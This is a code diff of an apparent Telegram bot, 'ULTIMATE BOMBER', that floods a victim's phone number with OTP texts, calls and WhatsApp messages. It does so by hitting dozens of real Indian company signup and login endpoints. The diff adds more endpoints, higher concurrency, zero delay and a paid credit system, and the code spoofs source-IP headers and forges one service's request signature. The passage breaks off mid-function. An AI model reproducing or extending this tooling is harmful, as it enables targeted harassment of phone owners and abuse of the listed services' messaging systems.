@@ -8,6 +8,7 @@ import uuid
 import hmac
 import hashlib
 import base64
+import json
 from typing import Optional
 
 import aiohttp
@@ -25,38 +26,102 @@ BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
 WEBHOOK_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 PORT        = int(os.environ.get("PORT", 8000))
 
-CONCURRENCY     = 100
-DELAY           = 0.5
-REQUEST_TIMEOUT = 5
+ADMIN_ID = 8959878185  
+
+# SPEED CONFIG (Render Safe)
+CONCURRENCY     = 400              
+DELAY           = 0.0              
+REQUEST_TIMEOUT = 3                
 # ============================================
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger("tsunami")
 
-user_sessions: dict = {}
+DB_FILE = "users.json"
+
+# DATABASE: Sirf Users ka data (Credits/Ban)
+users_db: dict = {}
+# SESSIONS: Sirf Bombing ka data (Target/Running)
+active_bombing: dict = {} 
+
 _http_session: Optional[aiohttp.ClientSession] = None
 telegram_app: Optional[Application] = None
 
+# ================== DATABASE ==================
+def load_db():
+    global users_db
+    if os.path.exists(DB_FILE):
+        try:
+            with open(DB_FILE, "r") as f:
+                users_db = json.load(f)
+        except Exception:
+            users_db = {}
+
+def save_db():
+    try:
+        with open(DB_FILE, "w") as f:
+            json.dump(users_db, f, indent=4)
+    except Exception as e:
+        logger.error(f"DB Save Error: {e}")
+
+def get_user(uid):
+    uid_str = str(uid)
+    if uid_str not in users_db:
+        users_db[uid_str] = {"credits": 0, "banned": False}
+        save_db()
+    return users_db[uid_str]
+
+load_db()
+
+# ================== HTTP SESSION ==================
+async def get_http_session() -> aiohttp.ClientSession:
+    global _http_session
+    if _http_session is None or _http_session.closed:
+        connector = aiohttp.TCPConnector(limit=500, limit_per_host=100, ssl=False)
+        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
+        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
+    return _http_session
 
 def is_valid_target(num: str) -> bool:
     return num.isdigit() and len(num) == 10 and num[0] in "6789"
 
-
 # =========================================================================
-#  ULTIMATE APIS  (SINGLE build_endpoints — duplicate removed)
+#  ULTIMATE MERGED APIS (Old + New)
 # =========================================================================
 def build_endpoints():
     UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
     UA_C2 = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
     E = []
 
-    # ---------- Bombitup CALL / IVR ----------
+    # ---------- 1. NEW APIS (From Hotstar, SonyLIV, Paytm, etc.) ----------
+    E.append({"name":"Hotstar","method":"PUT","url":"https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp","headers":{"Host":"api.hotstar.com","content-type":"application/json","x-hs-platform":"PCTV","origin":"https://www.hotstar.com","User-Agent":UA_C2},"data":'{"phone_number":"{t}","country_prefix":"91"}'})
+    E.append({"name":"AltBalaji","method":"POST","url":"https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN","headers":{"Accept":"application/json","X-API-KEY":"MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE","Content-Type":"application/json","Origin":"https://www.altbalaji.com","User-Agent":UA_C2},"data":'{"phone_number":"{t}","country_code":"91","platform":"web","exp":1601043289127}'})
+    E.append({"name":"SonyLIV","method":"POST","url":"https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP","headers":{"Accept":"application/json","x-via-device":"true","origin":"https://www.sonyliv.com","User-Agent":UA_C2},"data":'{"channelPartnerID":"MSMIND","mobileNumber":"{t}","country":"IN","timestamp":"2020-09-24T14:03:03.505Z"}'})
+    E.append({"name":"Medplus","method":"POST","url":"https://mobile.medplusindia.com/mobilemvc/profile/register.mbl","headers":{"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.medplusmart.com","User-Agent":UA_C2},"data":"recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami%40gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber={t}&SESSIONID=18JG8XgX4yS3cCKk7Es11Fy4thL5fqHLWW&isCordova=false&isPhonepeSwitch=false"})
+    E.append({"name":"Apollo","method":"POST","url":"https://webapi.apollo247.com/","headers":{"Authorization":"Bearer 18JG8XgX4yS3cCKk7Es11Fy4thL5fqHLWW","Content-Type":"application/json","Origin":"https://www.apollo247.com","User-Agent":UA_C2},"data":'{"operationName":"Login","variables":{"mobileNumber":"+91{t}","loginType":"PATIENT"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\nstatus\\nmessage\\nloginId\\n__typename\\n  }\\n}\\n"}'})
+    E.append({"name":"FBB","method":"POST","url":"https://www.fbbonline.in/customer/account/GenerateOtp","headers":{"X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.fbbonline.in","User-Agent":UA_C2},"data":"YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={t}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp="})
+    E.append({"name":"Grofers","method":"POST","url":"https://grofers.com/v2/accounts/","headers":{"device_id":"a11f656b-422e-4617-953b-c350d517467d","auth_key":"57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13","app_client":"consumer_web","Content-Type":"application/x-www-form-urlencoded","Origin":"https://grofers.com","User-Agent":UA_C2},"data":"user_phone={t}"})
+    E.append({"name":"Zomato","method":"POST","url":"https://www.zomato.com/webroutes/auth/login","headers":{"x-zomato-csrft":"a6b0c09972b2bdd30c9c1b6552caee5d","Content-Type":"application/json","Origin":"https://www.zomato.com","User-Agent":UA_C2},"data":'{"country_id":1,"phone":"{t}","verification_type":"sms","method":"phone"}'})
+    E.append({"name":"Dream11","method":"POST","url":"https://www.dream11.com/graphql/mutation/pwa/register","headers":{"device":"pwa","x-csrf":"fb1f1947-4547-392d-9a28-a9de30d9e766","Content-Type":"application/json","Origin":"https://www.dream11.com","User-Agent":UA_C2},"data":'{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"tsunami@gmail.com","mobileNumber":"{t}","password":"tsunami@123astronomia"}}'})
+    E.append({"name":"Careers360","method":"POST","url":"https://www.careers360.com/ajax/no-cache/user/otp-send","headers":{"X-CSRFToken":"9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj","X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.careers360.com","User-Agent":UA_C2},"data":"mobile_number={t}&method=call&uid=12692588"})
+    E.append({"name":"Gaana","method":"POST","url":"https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile","headers":{"channel":"gaana.com","platform":"android","Content-Type":"application/json","User-Agent":"Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)","Host":"jsso1.indiatimes.com"},"data":'{"mobile":"+91-{t}"}'})
+    E.append({"name":"Paytm","method":"POST","url":"https://accounts.paytm.com/v2/api/register","headers":{"Accept":"application/json","Origin":"https://accounts.paytm.com","Content-Type":"application/json","User-Agent":UA_C2},"data":'{"email":"","mobile":"{t}","loginPassword":"Pura@1090","csrfToken":"f7ea628c-91a2-5f14-82ca-6f7eee295b1d","redirectUri":"https://paytm.com/v1/api/authresponse","clientId":"paytm-web-secure","scope":"paytm","state":"","responseType":"code","theme":"mp-html5","dob_agreement":true}'})
+    E.append({"name":"Ogonn","method":"POST","url":"https://ogonn.in/otp","headers":{"Origin":"https://ogonn.in","X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_C2},"data":"_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={t}"})
+    E.append({"name":"Swiggy_Signup","method":"POST","url":"https://www.swiggy.com/mapi/auth/signup","headers":{"Origin":"https://www.swiggy.com","__fetch_req__":"true","Content-Type":"application/json","User-Agent":UA_C2},"data":'{"name":"dbdbdbd","email":"tsunami@gmail.com","password":"sndndndbdj283jsbsbs","referral_code":"","mobile":"{t}","_csrf":"jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}'})
+    E.append({"name":"Limeroad","method":"POST","url":"https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=","headers":{"Origin":"https://www.limeroad.com","Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_C2},"data":"utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id={t}"})
+    E.append({"name":"Banggood","method":"POST","url":"https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api","headers":{"X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded","Origin":"https://m.banggood.in","User-Agent":UA_C2},"data":"mobilePhone={t}&countryPhoneCode=91&type=1&verifyCode=KmUu"})
+    E.append({"name":"UrbanClap","method":"POST","url":"https://www.urbanclap.com/api/v2/growth/profile/generateOTP","headers":{"x-device-os":"web","x-version-name":"web_v4.137.2","Content-Type":"application/json","Origin":"https://www.urbancompany.com","User-Agent":UA_C2},"data":'{"country_id":"IND","phone":{"isd_code":"+91","phone_wo_isd":"{t}"},"device_type":"customer"}'})
+    E.append({"name":"Kotak","method":"POST","url":"https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc","headers":{"X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.kotak.com","User-Agent":UA_C2},"data":"cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile={t}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes"})
+    E.append({"name":"MakeMyTrip","method":"POST","url":"https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr","headers":{"deviceid":"a3d2f892-af4d-40d1-808a-db6286b8fe1f","visitor-id":"a3d2f892-af4d-40d1-808a-db6286b8fe1f","Content-Type":"application/json","Origin":"https://www.makemytrip.com","User-Agent":UA_C2},"data":'{"loginId":"{t}","type":"MOBILE","version":2,"countryCode":"91"}'})
+    E.append({"name":"Ola","method":"POST","url":"https://accounts.olacabs.com/api/login","headers":{"x-fingerprint-id":"3664542227","x-requested-with":"XMLHttpRequest","Content-Type":"application/json","Origin":"https://accounts.olacabs.com","User-Agent":UA_C2},"data":'{"mobileNumber":"{t}","dialingCode":"+91","countryCode":"IN"}'})
+    E.append({"name":"Oyo","method":"POST","url":"https://www.oyorooms.com/api/pwa/generateotp?locale=en","headers":{"xsrf-token":"vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0","Content-Type":"text/plain;charset=UTF-8","Origin":"https://www.oyorooms.com","User-Agent":UA_C2},"data":'{"phone":"{t}","country_code":"+91","nod":4}'})
+    E.append({"name":"BurgerKing","method":"POST","url":"https://consumer-apis.burgerking.in/api/v1/user/signUp","headers":{"appversion":"1.6","content-type":"application/json","platform":"web","Origin":"https://www.burgerking.in","User-Agent":UA_C2},"data":'{"phone_no":"{t}"}'})
+
+    # ---------- 2. OLD APIS ----------
     E.append({"name":"Swiggy_Call","method":"POST","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com"},"data":'{"mobile":"{t}"}'})
     E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
     E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","otp_on_call":true}'})
     E.append({"name":"MagicPin_Call","method":"POST","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","Origin":"https://magicpin.in","User-Agent":UA_D},"data":'{"phoneNumber":"91{t}","authMethod":"call","token":""}'})
-
-    # ---------- Bombitup IND ----------
     E.append({"name":"AjioLogin","method":"POST","url":"https://login.web.ajio.com/api/auth/generateLoginOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
     E.append({"name":"AjioSignup","method":"POST","url":"https://login.web.ajio.com/api/auth/signupSendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}","requestType":"SENDOTP","newDesign":false}'})
     E.append({"name":"BigBasketDaily","method":"POST","url":"https://bbdaily.bigbasket.com/bbd/ms/members/v2/sendotp","headers":{"Content-Type":"application/json","User-Agent":"BBD/Android/7.5.0/14"},"data":'{"identifier":"{t}","referrer":"unified_login"}'})
@@ -70,20 +135,14 @@ def build_endpoints():
     E.append({"name":"ZeptoSignup","method":"POST","url":"https://api.zepto.co.in/api/v1/user/customer/signup/","headers":{"Content-Type":"application/json","User-Agent":"okhttp/4.12.0"},"data":'{"signupType":"otp_sms","data":{"mobile_number":"{t}"}}'})
     E.append({"name":"ZestMoney","method":"POST","url":"https://app.zestmoney.in/zestlife/v2/Customer/GenerateOtp","headers":{"Content-Type":"application/json","User-Agent":"okhttp/4.9.1"},"data":'{"email":"","mobileNumber":"91{t}"}'})
     E.append({"name":"CountryDelight","method":"POST","url":"https://api.countrydelight.in/api/v1/customer/requestOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-source":"Android"},"data":'{"mobile_number":"{t}","new_user":true,"device":"Android","mode":"SMS"}', "hmac": True})
-
-    # ---------- Bombitup PAK ----------
     E.append({"name":"Ding","method":"POST","url":"https://www.ding.com/PhoneLogin/OwnedPhoneNumber","headers":{"Content-Type":"application/json; charset=UTF-8"},"data":'{"phoneNumber":"{t}","countryDial":92}'})
     E.append({"name":"GrocerApp","method":"POST","url":"https://endpoints.grocerapps.com/v1/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"{t}","type":"sms"}'})
     E.append({"name":"Udhaar","method":"POST","url":"https://web.udhaar.pk/udhaar/dukaan/create/sendotp/","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"0{t}","referer":null,"version":"multi-business"}'})
-
-    # ---------- Diljot WHATSAPP ----------
     E.append({"name":"KPN_WA","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB","headers":{"Content-Type":"application/json"},"data":'{"phone_number":{"number":"{t}","country_code":"+91"}}'})
     E.append({"name":"MamaEarth_WA","method":"POST","url":"https://auth.mamaearth.in/v1/auth/initiate-signup","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
     E.append({"name":"HeroFinCorp_WA","method":"POST","url":"https://loans.apps.herofincorp.com/api/generateOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","terms":true,"whatsapp":true}'})
     E.append({"name":"Refyne_WA","method":"POST","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","headers":{"Content-Type":"application/json"},"data":'{"channel":"WHATSAPP","recipient":"{t}"}'})
     E.append({"name":"VisitApp_WA","method":"POST","url":"https://api.getvisitapp.com/v3/new-auth/login-phone","headers":{"Content-Type":"application/json"},"data":'{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{t}","platform":"WEB"}'})
-
-    # ---------- Diljot / Tsunami SMS ----------
     E.append({"name":"Lenskart","method":"POST","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phoneCode":"+91","telephone":"{t}"}'})
     E.append({"name":"PharmEasy","method":"POST","url":"https://pharmeasy.in/api/v2/auth/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
     E.append({"name":"Wakefit","method":"POST","url":"https://api.wakefit.co/api/consumer-sms-otp/","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
@@ -134,11 +193,7 @@ def build_endpoints():
     E.append({"name":"Delhivery","method":"POST","url":"https://www.delhivery.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
     E.append({"name":"BookMyShow","method":"POST","url":"https://in.bookmyshow.com/auth/send/otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
     E.append({"name":"PVR","method":"POST","url":"https://www.pvrcinemas.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
-
-    # ---------- Extra Real ----------
     E.append({"name":"Voot_CheckUser","method":"POST","url":"https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"type":"mobile","mobile":"{t}","countryCode":"+91"}'})
-    E.append({"name":"MedPlus_Register","method":"POST","url":"https://mobile.medplusindia.com/mobilemvc/profile/register.mbl","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"recieveUpdates=1&mobileNumber={t}"})
-    E.append({"name":"Netmeds_Details","method":"GET","url":"https://m.netmeds.com/mst/rest/v1/id/details/{t}","headers":{"User-Agent":UA_D},"data":None})
     E.append({"name":"InstaCash_OTP","method":"POST","url":"https://getinstacash.in/sell/getData.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"type=sendOTP&mobile={t}"})
     E.append({"name":"Snapdeal_Signup","method":"POST","url":"https://m.snapdeal.com/signupCompleteAjax","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"j_mobilenumber={t}&agree=true&journey=mobile&swp=true"})
     E.append({"name":"Cuemath_Parent","method":"POST","url":"https://www.cuemath.com/api/v4/parents/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","email":"","full_name":"","place_id":""}'})
@@ -159,8 +214,6 @@ def build_endpoints():
     E.append({"name":"PizzaHut_OTP","method":"POST","url":"https://api.pizzahut.io/v1/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"+91{t}"}'})
     E.append({"name":"Dineout_Signup","method":"POST","url":"https://www.dineout.co.in/xhrajaxrequest/user_signup","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"name=&email=&phone={t}"})
     E.append({"name":"AngelBroking_Form","method":"POST","url":"https://www.angelbroking.com/form-gateways/oda-form.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"name=&mobile={t}&city=pune"})
-
-    # ---------- B9716D Real ----------
     E.append({"name":"Hungama_OTP","method":"POST","url":"https://communication.api.hungama.com/v1/communication/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNo":"{t}","countryCode":"+91","appCode":"un"}'})
     E.append({"name":"MeruCab_OTP","method":"POST","url":"https://merucabapp.com/api/otp/generate","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"mobile_number={t}"})
     E.append({"name":"Dayco_Ekyc","method":"POST","url":"https://ekyc.daycoindia.com/api/nscript_functions.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"api=send_otp&mob={t}"})
@@ -171,52 +224,31 @@ def build_endpoints():
     E.append({"name":"Doubtnut_v4","method":"POST","url":"https://api.doubtnut.com/v4/student/login","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"{t}","language":"en"}'})
     E.append({"name":"GoPinkCabs","method":"POST","url":"https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"check_mobile_number=1&contact={t}"})
     E.append({"name":"Flipkart_2Rome","method":"POST","url":"https://2.rome.api.flipkart.com/api/4/user/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
+    E.append({"name":"ASVM_Faizabad","method":"POST","url":"http://asvmfaizabad.org/register.php","headers":{"Content-Type":"application/x-www-form-urlencoded","Origin":"http://asvmfaizabad.org","User-Agent":UA_C2},"data":"sname=Tsunami&sclass=XII&sphone={t}&spassword=tsunamiastronomia&ssection=A&submit="})
 
     return E
 
-
 ENDPOINTS = build_endpoints()
-
-
-# ================== HTTP SESSION ==================
-async def get_http_session() -> aiohttp.ClientSession:
-    global _http_session
-    if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=200, limit_per_host=50, ssl=False)
-        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
-        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
-    return _http_session
-
 
 async def fire_endpoint(ep: dict, target: str) -> bool:
     url = ep["url"].replace("{t}", target)
     ts = str(int(time.time() * 1000))
     u_id = uuid.uuid4().hex
     url = url.replace("{timestamp}", ts).replace("{uuid}", u_id)
-
     spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
     headers = {k: v.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id) for k, v in ep["headers"].items()}
     headers["X-Forwarded-For"] = spoof
     headers["Client-IP"] = spoof
     headers["X-Request-Id"] = uuid.uuid4().hex
-
     data = ep["data"]
     if isinstance(data, str):
         data = data.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id)
-
     if ep.get("hmac"):
         secret = bytes.fromhex("4174697368204167726177616c20436f756e7472792044656c69676874")
         msg = f"{ts}|{target}|SMS".encode('utf-8')
         sig = base64.b64encode(hmac.new(secret, msg, hashlib.sha256).digest()).decode('utf-8')
         headers["X-Timestamp"] = ts
         headers["X-Signature"] = sig
-
-    if ep.get("special_sig"):
-        random_bytes = os.urandom(32)
-        sig = base64.b64encode(random_bytes).decode('utf-8')
-        headers["x-timestamp"] = ts
-        headers["x-signature"] = sig
-
     try:
         session = await get_http_session()
         async with session.request(method=ep["method"], url=url, headers=headers, data=data if data else None, ssl=False) as resp:
@@ -225,77 +257,136 @@ async def fire_endpoint(ep: dict, target: str) -> bool:
     except Exception:
         return False
 
-
 async def _fire_batch(batch, target):
     tasks = [fire_endpoint(ep, target) for ep in batch]
     results = await asyncio.gather(*tasks, return_exceptions=True)
     return sum(1 for r in results if r is True)
 
-
-# ================== HANDLERS ==================
+# ================== USER HANDLERS ==================
 async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[InlineKeyboardButton("🚀 START ULTIMATE BOMBER 🚀", callback_data="start_bomb")]]
+    uid = update.effective_user.id
+    user = get_user(uid)
+    if user.get("banned"):
+        return await update.message.reply_text("🚫 You are banned from using this bot.")
+    
+    keyboard = [[InlineKeyboardButton("🚀 START BOMBING", callback_data="start_bomb")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    text = "💥 **ULTIMATE BOMBER** 💥\n\nAll APIs loaded. Click below to begin."
+    text = (
+        f"💥 **ULTIMATE BOMBER** 💥\n\n"
+        f"👤 **Your Credits:** `{user['credits']}`\n"
+        f"*(1 Credit = 1 Minute Bombing)*\n\n"
+        f"Click below to start:"
+    )
     await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
-
 
 async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     uid = query.from_user.id
+    user = get_user(uid)
+
+    if user.get("banned"):
+        return await query.message.reply_text("🚫 You are banned.")
 
     if query.data == "start_bomb":
-        user_sessions[uid] = {"state": "awaiting_target", "running": False}
+        if user["credits"] < 1:
+            return await query.message.edit_text("❌ **Insufficient Credits!**\nAapke paas credits nahi hain. Admin se contact karein.")
+        
+        if str(uid) not in active_bombing:
+            active_bombing[str(uid)] = {}
+        active_bombing[str(uid)]["state"] = "awaiting_target"
         await query.message.edit_text("📱 Send target number (10 digits, no +91):")
 
     elif query.data == "stop_bomb":
-        s = user_sessions.get(uid)
+        s = active_bombing.get(str(uid))
         if s and s.get("running"):
             s["running"] = False
             s["cancelled"] = True
             await query.message.edit_text("🛑 **STOPPING...**", parse_mode="Markdown")
+            
+    elif query.data.startswith("credits_"):
+        mins = int(query.data.split("_")[1])
+        s = active_bombing.get(str(uid))
+        
+        if user["credits"] < mins:
+            return await query.answer("❌ Not enough credits!", show_alert=True)
+            
+        s["credits_to_use"] = mins
+        s["state"] = "running"
+        s["running"] = True
+        s["start_time"] = time.time()
+        s["sent"] = 0
+        
+        keyboard = [[InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bomb")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.message.edit_text(
+            f"💥 **BOMBING STARTED** 💥\n\n"
+            f"🎯 Target: `{s['target']}`\n"
+            f"⏱ Time Limit: `{mins} Minutes`\n"
+            f"⚡ Speed: Ultra Fast\n"
+            f"📡 APIs: {len(ENDPOINTS)}\n",
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
+        
+        asyncio.create_task(run_bombing(uid, s))
 
-
+# ================== TEXT HANDLER ==================
 async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     text = update.message.text.strip()
-    s = user_sessions.get(uid)
+    s = active_bombing.get(str(uid))
 
     if not s or s.get("state") != "awaiting_target":
         return
 
     if not is_valid_target(text):
-        await update.message.reply_text("❌ Invalid. 10 digits starting with 6/7/8/9.")
-        return
+        return await update.message.reply_text("❌ Invalid. 10 digits starting with 6/7/8/9.")
 
-    s.update(target=text, state="running", running=True, cancelled=False, sent=0, round=0, started_at=time.time())
+    user = get_user(uid)
+    if user["credits"] < 1:
+        return await update.message.reply_text("❌ Insufficient Credits!")
 
-    keyboard = [[InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bomb")]]
+    s["target"] = text
+
+    keyboard = [
+        [InlineKeyboardButton("1 Min (1 Credit)", callback_data="credits_1"), InlineKeyboardButton("5 Min (5 Credits)", callback_data="credits_5")],
+        [InlineKeyboardButton("10 Min (10 Credits)", callback_data="credits_10"), InlineKeyboardButton("30 Min (30 Credits)", callback_data="credits_30")]
+    ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-
+    
     await update.message.reply_text(
-        f"💥 **ULTIMATE BOMBER ACTIVATED** 💥\n\n"
-        f"🎯 Target: `{text}`\n"
-        f"⚡ Speed: MAXIMUM\n"
-        f"📡 Total APIs: {len(ENDPOINTS)}\n"
-        f"🔥 **DESTRUCTION STARTED!**",
+        f"🎯 Target Locked: `{text}`\n\n"
+        f"💳 Your Credits: `{user['credits']}`\n"
+        f"⏱ **How many minutes do you want to bomb?**\n"
+        f"*(Select the time below)*",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
 
-    asyncio.create_task(run_bombing(uid, s))
-
-
+# ================== BOMBING LOGIC ==================
 async def run_bombing(uid: int, s: dict):
     target = s["target"]
+    mins_to_use = s.get("credits_to_use", 1)
+    max_seconds = mins_to_use * 60
+    
     sent = 0
     start = time.time()
     idx = 0
+    last_report = start
+    
+    user = get_user(uid)
+    user["credits"] -= mins_to_use
+    save_db()
 
     try:
         while s.get("running"):
-            s["round"] += 1
+            if time.time() - start >= max_seconds:
+                s["time_up"] = True
+                break
+                
+            s["round"] = s.get("round", 0) + 1
             batch = []
             for _ in range(CONCURRENCY):
                 batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
@@ -305,8 +396,28 @@ async def run_bombing(uid: int, s: dict):
             sent += ok
             s["sent"] = sent
 
+            now = time.time()
+            if now - last_report >= 15:
+                last_report = now
+                try:
+                    elapsed = int(now - start)
+                    speed = int(sent / elapsed) if elapsed > 0 else 0
+                    await telegram_app.bot.send_message(
+                        uid,
+                        f"📊 **Live Update**\n"
+                        f"🎯 Target: `{target}`\n"
+                        f"📨 Sent: *{sent}*\n"
+                        f"⚡ Speed: *{speed} SMS/sec*\n"
+                        f"⏱ Time: {elapsed//60}m {elapsed%60}s / {mins_to_use}m",
+                        parse_mode="Markdown"
+                    )
+                except Exception:
+                    pass
+
             if DELAY > 0:
                 await asyncio.sleep(DELAY)
+            else:
+                await asyncio.sleep(0.01)
 
     except Exception as e:
         logger.exception(f"Bombing error: {e}")
@@ -314,33 +425,96 @@ async def run_bombing(uid: int, s: dict):
         s["running"] = False
 
     try:
-        bot = Bot(token=BOT_TOKEN)
         elapsed = int(time.time() - start)
-        reason = "🛑 Stopped by you" if s.get("cancelled") else "✅ Done"
-        await bot.send_message(uid, f"{reason}!\n\n🎯 Target: `{target}`\n📨 Total: *{sent}*\n⏱ Time: {elapsed}s", parse_mode="Markdown")
+        speed = int(sent / elapsed) if elapsed > 0 else 0
+        
+        if s.get("cancelled"):
